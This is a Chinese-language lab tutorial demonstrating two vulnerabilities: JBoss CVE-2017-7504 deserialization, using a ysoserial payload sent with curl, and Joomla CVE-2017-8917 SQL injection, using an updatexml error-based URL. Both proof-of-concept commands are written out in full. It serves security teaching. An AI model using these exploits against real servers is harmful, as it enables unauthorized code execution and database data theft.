# CVE-2017-7504 Java Deserialization
JBoss 4.x JBossMQ JMS 反序列化漏洞

Red Hat JBoss Application Server 是⼀款基于JavaEE的开源应⽤服务器。JBoss AS 4.x及之前版本 中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反 序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

1.该漏洞出现在 /jbossmq-httpil/HTTPServerILServlet 请求中，本次实验借助 ysoserial 的 CommonsCollections5 利⽤链来利用该漏洞。你可以从 [1] 下载 ysoserial-all.jar ，也可以直接使用仓库中的 ysoserial-all.jar 。此处需要大家有 Java环境[2]。
```
   java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/success" > poc.ser
```
2.发送漏洞利用
我们将poc.ser⽂件内容作为POST Body发送到目标靶机
```
curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser
```
执⾏docker-compose exec jboss bash进⼊容器，可⻅/tmp/success已成功创建。

# CVE-2017-8917 SQL Injection
## Joomla CVE-2017-8917 SQL注⼊
Joomla! in the real (online) world Joomla! is used all over the world to power millions of websites of all shapes and sizes. Joomla! can be used for: 
• Corporate websites or portals, intranets and extranets 
• Small business websites 
• Online magazines, newspapers, and publications 
• E-commerce and online reservations 
• Government, non-profit and organisational websites 
• Community-based, school and church websites or portals 
• Personal or family homepages ...

1.漏洞点（这里的path为Joomla的网址）
```
http://path/index.php? option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,co ncat(1,user()),1)
```
![[Pasted image 20240117152031.png]]此处简单解释，Mysql API updatexml 负责修改查询到的内容。updatexml 要求第二个参数是符合 xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息。详情请参考 [3]。
最后有⼀个小作业，如果想看到当前mysql的使用版本，怎么做？
[1]https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
[2]https://www.oracle.com/sg/java/technologies/downloads/
[3]https://xz.aliyun.com/t/253#toc-1